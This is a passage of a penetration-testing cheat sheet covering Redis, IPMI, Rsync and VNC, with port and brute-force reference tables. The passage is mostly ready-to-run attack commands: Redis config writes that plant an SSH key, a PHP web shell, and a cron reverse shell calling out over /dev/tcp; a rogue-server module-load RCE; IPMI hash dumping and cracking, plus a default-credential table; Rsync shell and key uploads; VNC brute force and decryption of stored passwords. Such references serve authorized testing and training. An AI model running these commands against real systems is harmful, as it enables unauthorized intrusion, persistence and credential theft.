GET <key>
```

### Unauthenticated File Write (RCE)

If Redis runs as root or has write access to sensitive dirs:

```bash
# Method 1 — Write SSH authorized_keys
redis-cli -h 10.10.10.10
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> SET payload "\n\nssh-rsa AAAA...your-public-key...\n\n"
> SAVE

# Then SSH in
ssh -i id_rsa root@10.10.10.10

# Method 2 — Write web shell (if web root is writable)
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET payload "<?php system($_GET['cmd']); ?>"
> SAVE

# Method 3 — Write cron job (RHEL/CentOS path; Debian/Ubuntu use /var/spool/cron/crontabs)
> CONFIG SET dir /var/spool/cron
> CONFIG SET dbfilename root
> SET payload "\n* * * * * bash -i >& /dev/tcp/10.10.14.5/9001 0>&1\n"
> SAVE
```

> [!warning] All three methods overwrite whatever file `dbfilename` points at, and leave the server's `dir`/`dbfilename` changed. Note the originals first (`CONFIG GET dir`, `CONFIG GET dbfilename`), restore them afterwards, and never point `dbfilename` at a file you can't afford to lose.

> [!note] The cron method is unreliable on Debian/Ubuntu: their cron rejects crontab files with the wrong mode or owner, and the RDB file Redis writes is neither 600 nor crontab-owned. Prefer the SSH-key method there. Redis 7+ blocks changing `dir`/`dbfilename` at runtime by default (`enable-protected-configs`), which kills all three methods unless an admin set it to `yes` or `local` (`local` = still allowed from 127.0.0.1, e.g. via SSRF).

### Redis Master-Slave RCE (Redis 4.x–5.x)

```bash
# redis-rogue-server — makes the target replicate from you, then loads a malicious .so via MODULE LOAD
# https://github.com/n0b0dyCN/redis-rogue-server
python3 redis-rogue-server.py --rhost 10.10.10.10 --lhost 10.10.14.5
# Redis 7+ ships with MODULE LOAD disabled (enable-module-command no) → this route is closed
```

---

## IPMI — UDP 623

### Enumeration

```bash
nmap -sU -p 623 10.10.10.10
nmap -sU -p 623 --script ipmi-version 10.10.10.10

# MSF — version and cipher detection
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS 10.10.10.10
run
```

### RAKP Hash Disclosure (IPMI 2.0 — no creds needed)

The IPMI 2.0 RAKP handshake sends the salted HMAC-SHA1 of a user's password **before** authentication completes. This is a flaw in the protocol spec, so there's no patch: every IPMI 2.0 BMC leaks a hash for any valid username.

```bash
# MSF — dump IPMI hashes (tries a built-in username list)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt     # OUTPUT_JOHN_FILE for john
run

# Crack with hashcat (IPMI2 RAKP HMAC-SHA1 = mode 7300)
hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

# HP iLO factory default = 8 chars of uppercase + digits → brute the whole keyspace
hashcat -m 7300 -a 3 /tmp/ipmi_hashes.txt -1 ?d?u ?1?1?1?1?1?1?1?1
```

**Cipher zero** is a separate bug: a BMC that accepts cipher suite 0 lets you log in as a known user with **any** password. Check for it with `auxiliary/scanner/ipmi/ipmi_cipher_zero`.

| BMC | Default creds |
|---|---|
| Dell iDRAC | `root:calvin` |
| HP iLO | `Administrator:<random 8-char factory password>` (printed on the server tag) |
| Supermicro IPMI | `ADMIN:ADMIN` |
| IBM IMM | `USERID:PASSW0RD` (zero, not O) |

> [!note] Cracked BMC creds are often reused for the BMC web interface, SSH, or OS accounts. BMC access itself = remote console, virtual media, and power control of the host.

---

## Rsync — TCP 873

### Enumeration

```bash
nmap -sV -p 873 10.10.10.10

# List available modules (shares)
rsync rsync://10.10.10.10/
rsync --list-only rsync://10.10.10.10/

# List files in a module
rsync --list-only rsync://10.10.10.10/module_name/
rsync --list-only rsync://user@10.10.10.10/module_name/
```

### Download / Upload

```bash
# Download entire module
rsync -av rsync://10.10.10.10/module_name /tmp/loot/

# Download with credentials
rsync -av rsync://user@10.10.10.10/module_name /tmp/loot/

# Upload file (if module is writable)
rsync -av /tmp/shell.php rsync://10.10.10.10/module_name/shell.php

# Upload SSH key (if module maps to home dir)
rsync -av ~/.ssh/id_rsa.pub rsync://10.10.10.10/module_name/.ssh/authorized_keys
```

---

## VNC — TCP 5900 / 5901+

VNC display numbers: display :0 → port 5900, display :1 → port 5901, etc.

### Enumeration

```bash
nmap -sV -p 5900-5910 10.10.10.10
nmap -p 5900 --script vnc-info,vnc-brute 10.10.10.10
```

### Brute Force

```bash
# VNC auth is password-only — no username, so no -l/-L
hydra -P passwords.txt vnc://10.10.10.10
hydra -s 5901 -P passwords.txt 10.10.10.10 vnc        # non-default port

# Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 10.10.10.10
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Connect

```bash
# vncviewer (Linux)
vncviewer 10.10.10.10:5900
vncviewer 10.10.10.10:5900 -passwd /tmp/vncpasswd

# Decode a stored VNC password — DES with a fixed, publicly known key, so it's reversible
# Linux: ~/.vnc/passwd (8 raw bytes)   Windows: RealVNC/TightVNC/UltraVNC registry keys or .ini
xxd -p ~/.vnc/passwd                    # → hex blob
echo -n <hex> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt \
  -K e84ad66020a5a2f1 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
# (-provider legacy is needed on OpenSSL 3, where single DES is disabled by default)

# Windows foothold — Metasploit pulls VNC passwords from the registry/ini files and decrypts them
use post/windows/gather/credentials/vnc
```

---

## Quick Reference — Ports

| Service | Port(s) | Protocol |
|---|---|---|
| FTP | 21 | TCP |
| SSH | 22 | TCP |
| SMTP | 25, 465, 587 | TCP |
| DNS | 53 | TCP/UDP |
| HTTP | 80 | TCP |
| POP3 | 110, 995 | TCP |
| RPC (portmapper) | 111 | TCP/UDP |
| IMAP | 143, 993 | TCP |
| SNMP | 161 | UDP |
| LDAP / LDAPS | 389, 636 | TCP |
| HTTPS | 443 | TCP |
| SMB | 139, 445 | TCP |
| MSRPC | 135 | TCP |
| MSSQL | 1433 | TCP |
| MySQL | 3306 | TCP |
| PostgreSQL | 5432 | TCP |
| RDP | 3389 | TCP |
| NFS | 2049 | TCP/UDP |
| WinRM | 5985, 5986 | TCP |
| Redis | 6379 | TCP |
| VNC | 5900+ | TCP |
| Rsync | 873 | TCP |
| IPMI | 623 | UDP |

---

## Quick Reference — Common Brute Force Commands

| Service | Command |
|---|---|
| SMB | `nxc smb <ip> -u users.txt -p pass.txt` |
| SSH | `hydra -L users.txt -P pass.txt ssh://<ip>` |
| FTP | `hydra -L users.txt -P pass.txt ftp://<ip>` |
| RDP | `crowbar -b rdp -s <ip>/32 -U users.txt -c pass` |
| WinRM | `nxc winrm <ip> -u users.txt -p pass.txt` |
| MSSQL | `nxc mssql <ip> -u users.txt -p pass.txt` |
| MySQL | `hydra -L users.txt -P pass.txt mysql://<ip>` |
| PostgreSQL | `hydra -L users.txt -P pass.txt postgres://<ip>` |
| SMTP | `hydra -L users.txt -P pass.txt smtp://<ip>` |
| SNMP | `onesixtyone -c community-strings.txt <ip>` |
| VNC | `hydra -P pass.txt vnc://<ip>` |
| IPMI hashes | `use auxiliary/scanner/ipmi/ipmi_dumphashes` |
| LDAP anonymous | `ldapsearch -H ldap://<ip> -x -b "DC=x,DC=x"` |

---

*Created: 2026-03-02*
*Updated: 2026-10-08*
*Model: claude-opus-5-5*
